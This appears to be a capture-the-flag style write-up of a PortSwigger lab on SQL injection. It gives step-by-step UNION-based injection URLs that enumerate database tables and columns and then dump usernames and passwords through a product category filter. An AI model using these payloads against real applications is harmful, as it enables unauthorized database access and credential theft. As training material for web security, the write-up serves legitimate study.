
# SQL injection attack, listing the database contents on non-Oracle databases

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user.

---------------------------------------------

References: 

- https://portswigger.net/web-security/sql-injection/examining-the-database

- https://portswigger.net/web-security/sql-injection/cheat-sheet

---------------------------------------------


We see there are 2 values displayed in the table, the description and the content of the post:



![img](images/SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20non-Oracle%20databases/1.png)


We find these payload are valid to display the 4 posts in Gifts and the second all the items:

```
/filter?category=Gifts'--
/filter?category=Gifts'+or+1=1--
```

Also, that there are 2 columns returned by the query and we can do a UNION attack with the payload:

```
/filter?category=Gifts'+union+all+select+NULL,NULL-- 
```

We can get the table names listing TABLE_NAME from information_schema.tables:

```
/filter?category=Gifts'+union+all+select+'1',TABLE_NAME+from+information_schema.tables--
```




![img](images/SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20non-Oracle%20databases/2.png)

Next list the columns in the table “users_vptjgu” with something like:

```
SELECT * FROM information_schema.columns WHERE table_name = 'users_vptjgu'
```

```
/filter?category=Gifts'+union+all+select+'1',COLUMN_NAME+from+information_schema.columns+WHERE+table_name+=+'users_vptjgu'--
```

We get 2 column names:



![img](images/SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20non-Oracle%20databases/3.png)

Next we must show the content of the table:

```
SELECT username_lvfons,password_femvin FROM users_vptjgu
```

```
/filter?category=Gifts'+union+all+select+username_lvfons,password_femvin+from+users_vptjgu--
```



![img](images/SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20non-Oracle%20databases/4.png)